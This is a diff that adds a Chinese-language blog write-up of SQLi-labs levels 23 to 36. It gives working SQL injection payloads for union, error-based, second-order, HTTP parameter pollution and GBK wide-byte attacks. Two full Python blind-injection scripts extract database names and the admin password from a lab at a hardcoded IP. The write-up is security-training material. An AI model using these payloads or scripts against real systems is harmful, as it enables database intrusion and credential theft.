@@ -1,0 +1,719 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SQLi-labs Advanced Injection | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SQLi-labs Advanced Injection | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Less 23
+Description: error based / strip comments
+$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+
+在获取id参..." />
+    <meta name="keywords" content="SQLi,Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SQLi-labs Advanced Injection
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-05-19
+              </span>
+              <span>
+                14 min read
+              </span>
+              <span class="page-view" key="20190519102500" title="SQLi-labs Advanced Injection">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/sqli/" class="post-tag">
+                  # SQLi
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <h2 id="less-23">Less 23</h2>
+<p>Description: error based / strip comments</p>
+<pre><code class="language-sql">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+</code></pre>
+<p>在获取<code>id</code>参数时进行了<code>#、--</code>注释符的过滤。</p>
+<pre><code class="language-sql"># id=-1' union select 1,database(),'3
+SELECT * FROM users WHERE id='-1' union select 1,database(),’3’ limit 0,1
+</code></pre>
+<p>回显：Your Login name:security / Your Password:3</p>
+<ul>
+<li>获取数据库和表名</li>
+</ul>
+<pre><code class="language-sql">union select 1,(select group_concat(schema_name) from information_schema.schemata), \
+(select group_concat(table_name) from information_schema.tables \
+where table_schema=database())'
+# information_schema,challenges,mysql,performance_schema,security
+# emails,referers,uagents,users
+</code></pre>
+<ul>
+<li>获取users表中的列</li>
+</ul>
+<pre><code class="language-sql">union select 1,(select group_concat(column_name) from information_schema.columns \
+where table_name='users'),'3
+# id,username,password
+</code></pre>
+<ul>
+<li>获取内容</li>
+</ul>
+<pre><code class="language-sql">union select 1,(select group_concat(username) from users),'3
+# Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,\
+# admin2,admin3,dhakkan,admin4
+</code></pre>
+<h2 id="less-24">Less 24</h2>
+<p>Description: POST / Second Oder Injections <em>Real treat</em> / Stored injections</p>
+<blockquote>
+<p>A second-order code injection attack is the process where malicious code is injected into a web-based application and not immediately executed but is stored by the application to be retrieved, rendered and executed by the victim later.</p>
+</blockquote>
+<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1558242073852-137c7b07-4f9a-4c46-95bf-258222378e00.png" alt="" loading="lazy"></figure>
+<p>注册 <code>admin'#</code>/<code>admin'--</code>账户，更新密码时构成:</p>
+<pre><code class="language-sql">UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username='admin'# ' AND password=''
+</code></pre>
+<p>从而更新<code>admin</code>的密码。</p>
+<h2 id="less-25">Less 25</h2>
+<p>Description: GET / Error based / All your OR &amp; AND belong to us / string single quote</p>
+<pre><code class="language-php">function blacklist($id) {
+	$id= preg_replace('/or/i',&quot;&quot;, $id);  //strip out OR (non case sensitive)
+	$id= preg_replace('/AND/i',&quot;&quot;, $id);  //Strip out AND (non case sensitive)
+	return $id;
+}
+</code></pre>
+<p>此关卡过滤了<code>and</code>、<code>or</code>关键字，常见的绕过方法为:</p>
+<ul>
+<li>大小写绕过(Or/oR/OR)</li>
+<li>编码绕过(hex/urlencode)</li>
+<li>添加注释(/or/)</li>
+<li>符号替换(&amp;&amp;/||)</li>
+</ul>
+<pre><code class="language-sql">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+</code></pre>
+<p>尝试<code>xpath</code>函数报错注入:</p>
+<pre><code class="language-sql"># or -&gt; ||
+?id=1'||extractvalue(1,concat(0x7e,database()))--+
+# XPATH syntax error: '~security'
+'||updatexml(1,concat(0x7e,(select group_concat(table_name) \
+from infoorrmation_schema.TABLES \ 
+where TABLE_SCHEMA=database()),0x7e),1)--+
+# XPATH syntax error: '~emails,referers,uagents,users~'
+</code></pre>
+<h2 id="less-25a">Less 25a</h2>
+<p>Description: GET / Blind based / All  your OR &amp; AND belong to us / Intiger based</p>
+<p>在<code>Less 25</code>的基础上改成了bool类型的的盲注，且作为数字类型不用考虑闭合。</p>
+<pre><code class="language-python"># coding=utf-8
+import requests
+import urllib
+
+main_url = &quot;http://43.247.91.228:84/Less-25a/?id=&quot;
+
+# signal
+correct = 'Your Password:Dumb'
+
+# data
+db_num = 0
+db_name = []
+current_db = ''
+
+# query it!
+def query_it(s):
+    s = urllib.parse.quote_plus(s)
+    url = main_url + s
+    html = requests.get(url)
+    if correct in html.text:
+        return True
+    return False
+
+# get database num
+def get_db_num():
+    payload_or = '2333 || (select if((select count(SCHEMA_NAME)' \
+        'from infoorrmation_schema.schemata)=%d, 1, 0))'
+    payload_and = '1 &amp;&amp; (select if((select count(SCHEMA_NAME)' \
+        'from infoorrmation_schema.schemata)=%d, 1, 0))'
+    for i in range(1, 10):
+        s = payload_or % i
+        if query_it(s):
+            return i
+    return -1
+
+# get database name length
+def get_db_name_length(db):
+    payload = '1 &amp;&amp; (select if(length((select SCHEMA_NAME '\
+        'from infoorrmation_schema.schemata limit %d, 1))%s%d, 1, 0))'
+    # binary search
+    left = 0
+    right = 50
+    while left &lt;= right:
+        mid = (left + right) // 2
+        s = payload % (db, '=', mid)
+        if query_it(s):
+            return mid
+        else:
+            s = payload % (db, '&gt;', mid)
+            if query_it(s):
+                left = mid + 1
+            else:
+                right = mid - 1
+    return -1
+
+
+# get database name
+def get_db_name():
+    payload = '2333 || ascii(substr((select SCHEMA_NAME ' \
+        'from infoorrmation_schema.schemata limit %d, 1), %d, 1))%s%d'
+    # db_id
+    for db_i in range(db_num):
+        print('[%d]' % db_i, end='')
+        length = get_db_name_length(db_i)
+        result = &quot;&quot;
+        for word_i in range(1, length + 1):
+            # binary search
+            left = 33
+            right = 127
+            while left &lt;= right:
+                mid = (left + right) // 2
+                s = payload % (db_i, word_i, '=', mid)
+                if query_it(s):
+                    result += chr(mid)
+                    print(chr(mid), end='')
+                    break
+                else:
+                    s = payload % (db_i, word_i, '&gt;', mid)
+                    if query_it(s):
+                        left = mid + 1
+                    else:
+                        right = mid - 1
+        db_name.append(result)
+        print()
+
+# get current database name
+def get_current_db():
+    print('[*]', end='')
+    payload = '1 &amp;&amp; ascii(substr((select database()), %d, 1))%s%d'
+    result = ''
+    for i in range(20):
+        left = 33
+        right = 127
+        while left &lt;= right:
+            mid = (left + right) // 2
+            s = payload % (i, '=', mid)
+            if query_it(s):
+                result += chr(mid)
+                print(chr(mid), end=&quot;&quot;)
+                break
+            else:
+                s = payload % (i, '&gt;', mid)
+                if query_it(s):
+                    left = mid + 1
+                else:
+                    right = mid - 1
+    print()
+    return result
+
+
+if __name__ == &quot;__main__&quot;:
+    print('[*]Searching the databse num...')
+    db_num = get_db_num()
+    print('[+]Database num is: %d' % db_num)
+    print('[*]Searching database name...')
+    get_db_name()
+    print(db_name)
+    print('[*]Searching the current database name...')
+    current_db = get_current_db()
+    print('[+]' + current_db)
+'''
+[*]Searching the databse num...
+[+]Database num is: 5
+[*]Searching database name...
+[0]information_schema
+[1]challenges
+[2]mysql
+[3]performance_schema
+[4]security
+['information_schema', 'challenges', 'mysql', 'performance_schema', 'security']
+[*]Searching the current database name...
+[*]security
+[+]security
+'''
+</code></pre>
+<h2 id="less-26">Less 26</h2>
+<p>Description: GET / Error based / All your SPACES &amp; COMMENTS belong to us</p>
+<pre><code class="language-php">function blacklist($id) {
+	$id= preg_replace('/or/i',&quot;&quot;, $id); //strip out OR (non case sensitive)
+	$id= preg_replace('/and/i',&quot;&quot;, $id); //Strip out AND (non case sensitive)
+	$id= preg_replace('/[\/\*]/',&quot;&quot;, $id); //strip out /*
+	$id= preg_replace('/[--]/',&quot;&quot;, $id); //Strip out --
+	$id= preg_replace('/[#]/',&quot;&quot;, $id);	//Strip out #
+	$id= preg_replace('/[\s]/',&quot;&quot;, $id); //Strip out spaces
+   	//\s匹配任何空白字符，包括空格、制表符、换页符等等
+	$id= preg_replace('/[\/\\\\]/',&quot;&quot;, $id); //Strip out slashes
+	return $id;
+}
+</code></pre>
+<p>在<code>Less 25</code>的基础上过略了空格和注释符，常见的bypass空格方法:</p>
+<ul>
+<li>
+<p>双写空格/换行符/制表符绕过(linfeed<code>%0a</code>、tab<code>%09</code>、NBSP:Non-breaking Space<code>%a0</code>)</p>
+</li>
+<li>
+<p>注释符<code>/**/</code>、<code>()</code>、反引号绕过</p>
+</li>
+</ul>
+<pre><code class="language-sql"># /**/
+select/**/username/**/from/**/user/**/where/**/id=1;
+# ()
+select(username)from(user)where(id=1);
+# `
+select*from`user`where`id`=1;
+</code></pre>
+<p>Payload:</p>
+<pre><code class="language-sql"># NBSP：Non-breaking Space %a0
+id=2333'%a0||%a0updatexml(1,concat(0x7e,(SELECT%0a@@version),0x7e),1)='1
+#  XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~' 
+# ()
+id=2333'||updatexml(1,concat(0x7e,(select(group_concat(table_name))\
+from(infoorrmation_schema.tables)\
+where(table_schema=database())),0x7e),1)='1
+# XPATH syntax error: '~emails,referers,uagents,users~'
+# 反引号 `
+id=2333'||updatexml(1,concat(0x7e,(select`email_id`\
+from`emails`where`id`=1),0x7e),1)='1
+# XPATH syntax error: '~Dumb@dhakkan.com~'
+</code></pre>
+<h2 id="less-26a">Less 26a*</h2>
+<p>Description: GET / Blind based / All your SPACE and COMMENTS Belong to us / String-single-quotes / Parenthesis</p>
+<p>在上一题的基础上修该闭合方式为<code>('$id')</code>，同时关闭了错误回显。</p>
+<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;;
+</code></pre>
+<p>Payload:</p>
+<pre><code class="language-python"># -*- coding: utf-8 -*-
+import re
+import requests
+from urllib.parse import quote_plus
+
+main_url = 'http://43.247.91.228:84/Less-26a/?id='
+
+correct = r'Your Password:Dumb'
+
+# payload
+cur_db_name_ = '2333\') || ascii(substr((select database()), %d, 1))%s(\'%d'
+cur_db_tabs_ = '2333\') || ascii(substr((select group_concat(table_name) '\
+    'from infoorrmation_schema.tables '\
+        'where table_schema=database()), %d, 1))%s(\'%d'
+columns_ = '2333\') || ascii(substr((select group_concat(column_name) '\
+    'from infoorrmation_schema.columns '\
+        'where table_schema=database() '\
+            'anandd table_name=\'users\'), %d, 1))%s(\'%d'
+password_ = '2333\') || ascii(substr((select passwoorrd '\
+    'from users where username=\'admin\'),%d,1))%s(\'%d'
+
+def check(query_string):
+    query_string = query_string.replace(' ', '%a0')
+    #print(query_string)
+    url = main_url + query_string
+    html = requests.get(url)
+    if correct in html.text:
+        return True
+    return False
+
+def search(payload):
+    print('[*]' + payload)
+    result = ''
+    print('[~]', end = '')
+    for i in range(1, 100):
+        left = 33
+        right = 127
+        #binary search
+        while left &lt;= right:
+            mid = (left + right) // 2
+            s = payload % (i, '=', mid)
+            if check(s):
+                result += chr(mid)
+                print(chr(mid), end = '')
+                break
+            else:
+                s = payload % (i, '&gt;', mid)
+                if check(s):
+                    left = mid + 1
+                else:
+                    right = mid - 1
+        if left &gt; right:
+            break
+    print()
+    return result
+
+if __name__==&quot;__main__&quot;:
+    cur_db_name = search(cur_db_name_)
+    print('[+]current_db:' + cur_db_name)
+    cur_db_tabs = search(cur_db_tabs_)
+    print('[+]tables:' + cur_db_tabs)
+    columns = search(columns_)
+    print('[+]users columns:' + columns)
+    password = search(password_)
+    print('[+]admin password:' + password)
+</code></pre>
+<h2 id="less-27">Less 27</h2>
+<p>Description: GET / Error based / All your UNION &amp; SELECT Belong to us / Single quotes</p>
+<pre><code class="language-php">function blacklist($id) {
+	$id= preg_replace('/[\/\*]/',&quot;&quot;, $id); //strip out /*
+	$id= preg_replace('/[--]/',&quot;&quot;, $id); //Strip out --.
+	$id= preg_replace('/[#]/',&quot;&quot;, $id); //Strip out #.
+	$id= preg_replace('/[ +]/',&quot;&quot;, $id); //Strip out spaces.
+	$id= preg_replace('/select/m',&quot;&quot;, $id); //Strip out spaces.
+	$id= preg_replace('/[ +]/',&quot;&quot;, $id); //Strip out spaces.
+	$id= preg_replace('/union/s',&quot;&quot;, $id); //Strip out union
+	$id= preg_replace('/select/s',&quot;&quot;, $id);	//Strip out select
+	$id= preg_replace('/UNION/s',&quot;&quot;, $id); //Strip out UNION
+	$id= preg_replace('/SELECT/s',&quot;&quot;, $id); //Strip out SELECT
+	$id= preg_replace('/Union/s',&quot;&quot;, $id); //Strip out Union
+	$id= preg_replace('/Select/s',&quot;&quot;, $id); //Strip out select
+	return $id;
+}
+</code></pre>
+<p>过滤了:</p>
+<pre><code class="language-bash">union UNION Union
+select SELECT Select
+</code></pre>
+<p>可以考虑大小写混合<code>UnIoN、SeLeCt</code>/双写<code>uniunionon、selselectect</code>进行绕过。</p>
+<h2 id="less-27a">Less 27a</h2>
+<p>Description: GET / Blind based / All your UNION &amp; SELECT Belong to us / Double quotes</p>
+<p>在Less 27的基础上改为盲注，闭合方方式为<code>&quot;</code>，Payload可以参考Less 26a进行修改~</p>
+<h2 id="less-28">Less 28</h2>
+<p>Description: GET / Error based(Blind Based) / All your UNION &amp; SELECT Belong to us / String-single-quotes with parenthesis</p>
+<p>在Less 27的基础上闭合方式改为<code>('$id')</code>，没什么新意~</p>
+<h2 id="hpp">HPP*</h2>
+<blockquote>
+<p>Supplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways. By exploiting these effects, an attacker may be able to bypass input validation, trigger application errors or modify internal variables values. As HTTP Parameter Pollution (in short <em>HPP</em>) affects a building block of all web technologies, server and client side attacks exist.</p>
+</blockquote>
+<p>HTTP参数污染(HTTP Parameter Pollution)即通过利用Web应用程序对具有相同名称的多个HTTP参数解析方式的差异，绕过输入验证，从而触发应用程序错误或修改内部变量值。</p>
+<p>一些Web服务器的参数解析规则:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Web Server</th>
+<th style="text-align:center">Function</th>
+<th style="text-align:center">Obtained Parameter</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Apache/PHP</td>
+<td style="text-align:center">$_GET[&quot;par&quot;]</td>
+<td style="text-align:center">Last</td>
+</tr>
+<tr>
+<td style="text-align:center">Apache/Perl(CGI)</td>
+<td style="text-align:center">Param(&quot;par&quot;)</td>
+<td style="text-align:center">First</td>
+</tr>
+<tr>
+<td style="text-align:center">Apache/Python</td>
+<td style="text-align:center">getvalue(&quot;par&quot;)</td>
+<td style="text-align:center">All(List)</td>
+</tr>
+<tr>
+<td style="text-align:center">Tomcat/Jsp</td>
+<td style="text-align:center">Request.getParameter(&quot;par&quot;)</td>
+<td style="text-align:center">First</td>
+</tr>
+<tr>
+<td style="text-align:center">IIS/Asp</td>
+<td style="text-align:center">Request.QueryString(&quot;par&quot;)</td>
+<td style="text-align:center">All (comma-delimited string)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="less-29">Less 29</h2>
+<p>Description: GET / Error based / IMPIDENCE MISMATCH / Having a WAF in front of web application</p>
+<p>这里使用<code>Tomcat</code>容器作为WAF来过滤掉危险字符，匹配规则<code>^\\d+$</code>纯数字为合法，过滤后的由Apache服务器处理后返回，可以利用HPP来进行攻击，构造参数<code>id=1&amp;id=payload</code>绕过，Tomcat解析时取值id=1，Apache解析时取值<code>id=payload</code>。</p>
+<ul>
+<li>攻击时序</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1558749798187-0b947be2-9eb3-41a3-831f-de76cb9f96de.png" alt="" loading="lazy"></figure>
+<h2 id="less-30">Less 30</h2>
+<p>Description: GET / Blind / IMPIDENCE  MISMATCH / Having a WAF in front of web application.</p>
+<pre><code class="language-php">$qs = $_SERVER['QUERY_STRING'];
+$hint = $qs;
+$id = '&quot;' .$id. '&quot;'; //拼接了&quot;作为闭合方式
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre>
+<p>在Less 29的基础上改为关闭错误回显，改为盲注，Payload脚本可参考Less 26a.</p>
+<h2 id="less-31">Less 31</h2>
+<p>Description:  GET / Blind / IMPIDENCE  MISMATCH / Having a WAF in front of web application.</p>
+<pre><code class="language-php">$qs = $_SERVER['QUERY_STRING'];
+$hint = $qs;
+$id = '&quot;'.$id.'&quot;'; //&quot;&quot;
+$sql=&quot;SELECT * FROM users WHERE id= ($id) LIMIT 0,1&quot;; //()
+</code></pre>
+<p>闭合方式为<code>(&quot;&quot;)</code>，bypass方法与Less 29、30相同。</p>
+<h2 id="less-32">Less 32</h2>
+<p>Description: GET / bypass custom filter adding slashes to dangerous chars.</p>
+<pre><code class="language-php">function check_addslashes($string) {
+    //escape any backslash 去除反斜线\
+    $string = preg_replace('/'. preg_quote('\\') .'/', &quot;\\\\\\&quot;, $string); 
+    //escape single quote with a backslash 去除\'
+    $string = preg_replace('/\'/i', '\\\'', $string); 
+    //escape double quote with a backslash 去除\&quot;
+    $string = preg_replace('/\&quot;/', &quot;\\\&quot;&quot;, $string); 
+    return $string;
+}
+mysql_query(&quot;SET NAMES gbk&quot;);
+$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+</code></pre>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/1719">【PHP代码审计】入门之路——第二篇-宽字节注入</a></p>
+</blockquote>
+<p><code>%df’</code> 被PHP转义（GPC/addslashes()/iconv/），单引号被加上反斜杠\，变成了<code>%df\’</code>，其中\的十六进制是 <code>%5C</code> ，那么现在 <code>%df\’</code> =<code>%df%5c%27</code>，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 <code>%df%5c</code> 是一个宽字符，也就是<code>運’</code>，也就是说：<code>%df\’</code> = <code>%df%5c%27</code>=<code>運’</code>,从而逃逸出<code>'</code>。</p>
+<pre><code class="language-sql">%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運' //逃逸单引号
+id=%df%27 union select 1,database(),3%23
+# �\' union select 1,database(),3#
+# Your Login name:security
+id=%df' or updatexml(1,concat(0x7e,(select group_concat(table_name)
+from information_schema.TABLES 
+where TABLE_SCHEMA=database()),0x7e),1)--+
+#XPATH syntax error: '~emails,referers,uagents,users~'
+</code></pre>
+<h2 id="less-36">Less 36</h2>
+<p>Description: GET / Bypass mysql_real_escape_string()</p>
+<pre><code class="language-php">function check_quotes($string) {
+    $string= mysql_real_escape_string($string);    
+    return $string;
+}
+mysql_query(&quot;SET NAMES gbk&quot;);
+$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+</code></pre>
+<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>下列字符受影响：</p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>'</li>
+<li>&quot;</li>
+<li>\x1a</li>
+</ul>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
+<p>Payload: ?id=<code>%df'</code></p>
+<pre><code class="language-sql">or updatexml(1,concat(0x7e,(select group_concat(table_name) 
+from information_schema.TABLES 
+where TABLE_SCHEMA=database()),0x7e),1)--+
+# XPATH syntax error: '~emails,referers,uagents,users~' 
+</code></pre>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#less-23">Less 23</a></li>
+<li><a href="#less-24">Less 24</a></li>
+<li><a href="#less-25">Less 25</a></li>
+<li><a href="#less-25a">Less 25a</a></li>
+<li><a href="#less-26">Less 26</a></li>
+<li><a href="#less-26a">Less 26a*</a></li>
+<li><a href="#less-27">Less 27</a></li>
+<li><a href="#less-27a">Less 27a</a></li>
+<li><a href="#less-28">Less 28</a></li>
+<li><a href="#hpp">HPP*</a></li>
+<li><a href="#less-29">Less 29</a></li>
+<li><a href="#less-30">Less 30</a></li>
+<li><a href="#less-31">Less 31</a></li>
+<li><a href="#less-32">Less 32</a></li>
+<li><a href="#less-36">Less 36</a></li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-05-25-SQLi-labs-Stacked-Injection/">
+                <h3 class="post-title" style="text-align: left;">
+                  SQLi-labs Stacked Injection
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-XSS-game-alert-1-writeup/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  XSS game alert(1) writeup
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
